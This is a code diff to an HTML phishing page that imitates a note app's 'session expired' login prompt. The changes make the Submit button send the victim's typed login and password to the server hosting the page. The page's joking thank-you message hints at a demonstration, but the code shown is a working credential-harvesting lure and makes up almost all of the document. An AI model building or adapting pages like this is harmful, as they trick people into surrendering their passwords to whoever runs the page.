@@ -3,7 +3,7 @@
   <head>
     <style>
       body {
-        font-family: -apple-system;
+        font-family: -apple-system, Arial;
         text-align: center;
       }
       body > div {
@@ -23,7 +23,11 @@
     </style>
     <script>
       function send() {
-        document.body.innerHTML = 'Thanks for the login and password!'
+        var xhr = new XMLHttpRequest()
+        xhr.open('POST', document.location.href)
+        xhr.send(JSON.stringify({login: document.getElementById('login').value, password: document.getElementById('password').value}))
+        xhr.onload = () => document.body.innerHTML = 'Thanks for the login and password!'
+        xhr.onerror = err => document.body.innerHTML = 'Request failed: ' + err.message
       }
     </script>
   </head>
@@ -32,8 +36,8 @@
       <img width="64" height="64" src="https://dl2.macupdate.com/images/icons256/57481.png?d=1550654864">
     </div>
     <div>Your session has expired.<br>To continue viewing the note please log in:</div>
-    <div><input type="text" placeholder="Login" name="login"></div>
-    <div><input type="password" placeholder="Password" name="password"></div>
+    <div><input id="login" type="text" placeholder="Login" name="login"></div>
+    <div><input id="password" type="password" placeholder="Password" name="password"></div>
     <button onclick="send()" style="cursor: pointer; -moz-user-select: none; transition: background 120ms ease-in 0s; display: inline-flex; align-items: center; justify-content: center; white-space: nowrap; border-radius: 3px; height: 32px; padding: 0px 12px; font-size: 14px; line-height: 1.2; border: 1px solid rgba(55, 53, 47, 0.16); margin-left: 12px; flex: 1 1 0%;">Submit</button>
   </body>
 </html>
